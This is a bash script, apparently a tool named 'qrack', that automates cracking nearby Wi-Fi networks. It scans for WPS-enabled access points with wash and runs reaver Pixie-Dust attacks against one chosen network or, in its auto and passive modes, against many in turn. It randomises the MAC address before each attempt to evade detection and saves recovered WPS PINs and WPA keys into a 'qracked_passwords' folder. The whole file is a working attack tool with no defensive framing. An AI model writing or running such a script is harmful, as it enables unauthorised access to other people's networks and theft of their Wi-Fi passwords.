#!/bin/bash

####################   CONFIG   ####################

scan_time=15
# The amount of time to give to scan for networks

timeout=15
# The amount of time to allow a network to respond before moving on to next network (in auto mode)

scan_time_passive=10
# The same thing as scan_time, but for passive mode. This should be shorter.

timeout_passive=8
# The same thing as timeout, but for passive mode. This should be shorter.

passive_network_count=3
# How many networks should be tried in a single session in passive mode.
# Default is 3 and should probably not be changed

min_signal_strength=100
# Ignore networks weaker than this db strength (signal strength is negative, but do not add a "-")
#		The higher the number, the weaker the signal strength is (eg, -85db is weaker than -25db)

disable_direct_devices=1
# Ignore network that start with "DIRECT", as these are normally local internet-less
# networks hosted by smart TV's and wireless printers.

####################   CONFIG   ####################

src=${BASH_SOURCE[0]}
if [[ "$src" =~ "./" ]]; then
echo do nothing
else 
cd ~
fi

ps=0
rm -rf *.wpc *.db cpid.info wirecmd.txt
interface=$1
mode=$2
if [ "$mode" == "passive" ]; then
adj_scan_time=$scan_time_passive
adj_timeout=$timeout_passive
else 
adj_scan_time=$scan_time
adj_timeout=$timeout
fi
if [ "$1" == "help" ] || [ "$1" == "" ]; then
echo Usage: $src \<interface\> \[auto\|passive\]
exit
fi
sudo airmon-ng start ${interface}
if iwconfig ${interface}mon | grep "Monitor"; then interface=${interface}mon; fi
if ! ifconfig | grep -q "$interface"; then
clear
echo Interface \"$interface\" does not exist.
exit
fi
if [ "$mode" == "auto" ]; then
echo test
fi
rm ~/parsed_results.txt
mkdir qracked_passwords
clear
echo
redo="true"
while [ "$redo" == "true" ]; do
redo="false"
echo Searching for networks......
wash -i $interface > ~/net_res.txt &
sleep $adj_scan_time
killall wash
sed -i -e 1,2d ~/net_res.txt
cnt=0
networks=()
channels=()
essids=()
while IFS= read -r line; do
essid=${line:49:32} 
bssid=${line:0:17}
channel=${line:21:1}
signal=${line:24:3}
teststrength=${signal:1}
if [ "$teststrength" -le "$min_signal_strength" ]; then
if [[ ! "$essid" =~ "DIRECT" && "$disable_direct_devices" == "1" ]] || [ "$disable_direct_devices" == "0" ]; then
let "cnt++"
echo $essid >> essids.db
echo $bssid >> bssids.db
echo $channel >> channels.db
echo -e "[$cnt]   ${bssid}   ${signal}   ${channel}   ${essid}" >> ~/parsed_results.txt
networks+=(${bssid})
channels+=(${channel})
essids+=(${essid})
fi
fi
done < ~/net_res.txt
clear
echo
echo Networks found:
echo
echo
cat ~/parsed_results.txt
echo
echo
auto_bssids=()
auto_channels=()
auto_essids=()
if [ "$mode" == "" ]; then
read -p "Enter network number: " netsel
let "netsel--"
sel_net=${networks[${netsel}]}
sel_cha=${channels[${netsel}]}
sel_ess=${essids[${netsel}]}
auto_bssids+=("nothinghere")
else
while IFS= read -r line; do
auto_bssids+=("${line}")
done < bssids.db
while IFS= read -r line; do
auto_channels+=("${line}")
done < channels.db
while IFS= read -r line; do
auto_essids+=("${line}")
done < essids.db
fi
succ=0
echo ${!auto_bssids[@]}


if [[ "$mode" == "" || "$mode" == "auto" ]]; then
searchnumber=${#auto_bssids[@]}
fi
if [ "$mode" == "passive" ]; then
searchnumber=$passive_network_count
fi



for (( i = 0; i < $searchnumber; i++ )) do
if [ "$mode" == "" ]; then
echo placeholder
else
sel_net=${auto_bssids[$i]}
sel_cha=${auto_channels[$i]}
sel_ess=${auto_essids[$i]}
fi
if ! grep -q "$sel_net" "succeeded_networks.db"; then
echo $i
if ! [ "$mode" == "" ]; then
cat >waitkill <<EOL
kill -9 $(cat cpid.info)
echo \${BASHPID} > cpid.info
sleep $adj_timeout
if cat wirecmd.txt | grep "Received M1"; then sleep 30; sudo killall reaver; else sudo killall reaver; fi
EOL
chmod 777 waitkill
./waitkill &
fi
reavercmd=$(echo reaver -i $interface -b $sel_net -c $sel_cha -vv -K 1 -N -w  2\>\&1 \| tee wirecmd.txt)
echo $reavercmd > ~/reaver.cmd
chmod 777 ~/reaver.cmd
clear
echo
if ! [ "$mode" == "" ]; then
if [ "$mode" == "passive" ]; then
total=3
else
total=${#auto_bssids[@]}
fi
cn=$i
let "cn++"
echo Auto/Passive mode ON!
echo -e "Current network:      $cn / $total"
echo -e "Current Successes:    $succ / $i"
fi
if [ "$mode" == "passive" ]; then
echo -e "Passsive Successes:   ${ps}"
fi
echo Target network: $sel_ess / $sel_net
echo Running reaver command: $reavercmd
echo
echo
ifconfig $interface down
macchanger -r $interface
ifconfig $interface up
~/./reaver.cmd
kill -9 $(cat cpid.info) 
if cat wirecmd.txt | grep -i "WPS PIN:"; then
echo $sel_net >> succeeded_networks.db
HealthyNetworkName=$(echo $sel_ess | tr -dc '[:alnum:]\n\r')
cat wirecmd.txt | grep -i "WPS PIN:" > ${HealthyNetworkName}_PASSWORD.txt
cat wirecmd.txt | grep -i "WPA KEY:" >> ${HealthyNetworkName}_PASSWORD.txt
let "succ++"
let "ps++"
fi
fi
done
clear
echo
echo
echo
echo
if ls *_PASSWORD.txt > /dev/null 2>&1; then
chmod 777 *_PASSWORD.txt
ls *_PASSWORD.txt
sudo mv *_PASSWORD.txt qracked_passwords/
fi
if [ "$mode" == "" ]; then
exit
fi
if [ "$mode" == "passive" ]; then
redo="true"
fi
done
echo
echo
echo qrack has completed.
echo -e "Successes: $succ / $total"
echo
echo